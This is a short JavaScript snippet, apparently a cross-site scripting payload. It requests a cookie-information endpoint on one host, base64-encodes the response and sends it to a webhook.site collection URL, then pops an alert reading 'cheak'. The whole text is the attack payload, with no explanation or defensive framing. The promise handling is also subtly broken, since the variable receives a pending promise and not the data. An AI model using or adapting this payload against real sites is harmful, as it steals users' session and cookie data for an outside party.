let htmlText='';
const request=new XMLHttpRequest();
fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res => htmlText=res.json());
setTimeout(function(){
      const aba = btoa(htmlText);
      fetch("https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/"+btoa(htmlText));
},1000);
setTimeout(function(){
      alert('cheak');
},1000);

